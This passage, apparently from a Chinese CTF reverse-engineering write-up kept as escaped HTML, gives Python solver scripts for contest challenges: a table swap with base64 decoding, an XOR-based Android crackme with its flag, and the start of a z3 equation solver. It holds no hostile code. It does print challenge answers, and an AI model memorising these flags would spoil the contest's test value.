&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;得到新表后，用base64的脚本or工具直接解出&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192116991-792132925.png&#34;
	width=&#34;566&#34;
	height=&#34;486&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192116991-792132925_hu3101037329371313582.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192116991-792132925_hu10155506672398573520.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;279px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;题目名称babyandroid&#34;&gt;题目名称:BabyAndroid
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;Nameless&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;直接扔进JEB&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192117988-1583326165.png&#34;
	width=&#34;1080&#34;
	height=&#34;537&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192117988-1583326165_hu9961216863863885350.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192117988-1583326165_hu15125304339161611523.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;201&#34;
		data-flex-basis=&#34;482px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进去后发现看不懂，直接decompile&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192119660-470757390.png&#34;
	width=&#34;1256&#34;
	height=&#34;688&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192119660-470757390_hu14942983531376471941.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192119660-470757390_hu379410378975314532.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;438px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;稍微代码审计一下发现就是一个简单的异或&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192120392-1334151387.png&#34;
	width=&#34;1426&#34;
	height=&#34;275&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192120392-1334151387_hu6919541736377453925.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192120392-1334151387_hu9099975008936370583.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;518&#34;
		data-flex-basis=&#34;1244px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;上脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;li&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;67&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;61&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;68&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;84&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;st&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tHi$_Is_CKrRect_aNsTer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;flag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{J3b_Is_aG0odTO01}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;st&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;li&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;题目名称方程组&#34;&gt;题目名称:方程组?
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;Nameless&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;解线性方程组&lt;/p&gt;
&lt;p&gt;直接上脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;z3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v4&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v5&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v6&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v7&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v9&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v10&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
